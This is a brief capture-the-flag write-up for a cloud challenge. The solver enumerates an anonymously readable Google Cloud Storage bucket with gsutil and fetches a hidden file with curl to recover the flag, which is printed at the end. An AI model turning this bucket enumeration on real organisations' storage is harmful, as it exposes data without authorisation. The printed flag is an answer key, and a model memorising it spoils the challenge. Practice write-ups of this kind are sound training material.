#### Challenge:

Aw yea have you guys SEEN my new website... its nearly done I swear! I've uploaded it to the ☁️CLOUD☁️ and shared it with you guys now so you can see it! Check it out here [index.html](https://storage.googleapis.com/the-bad-bucket-ductf/index.html)

---

#### Solution:

Knowing the site is hosted on the `GCP bucket` I installed the `gsutils`, listed the bucket and got the file with the `flag`, all with the `anonymous access`:

```bash
./bin/gsutil ls gs://the-bad-bucket-ductf
./bin/gsutil ls gs://the-bad-bucket-ductf/buckets/
curl https://storage.googleapis.com/the-bad-bucket-ductf/buckets/.notaflag
```

---

<details><summary>FLAG:</summary>

```
DUCTF{if_you_are_beggining_your_cloud_journey_goodluck!}
```

</details>
<br/>
